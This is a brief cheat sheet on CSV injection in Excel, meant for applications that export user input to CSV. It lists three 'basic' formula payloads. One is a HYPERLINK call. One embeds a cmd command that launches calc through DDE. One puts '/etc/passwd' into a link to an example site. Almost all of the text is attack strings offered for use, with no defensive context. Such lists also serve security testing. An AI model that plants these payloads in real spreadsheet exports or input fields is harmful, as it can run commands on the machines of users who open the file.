### CSV Injection in the Excel
## This attack can be performed where the application has the CSV download feature for the provided input
## Basic payload that be used

        =HYPERLINK("https://example.com","test")
        =HYPERLINK("=cmd|'/C calc'!A0","test")
        =HYPERLINK("https://example-site.com/?module=/etc/passwd","test")
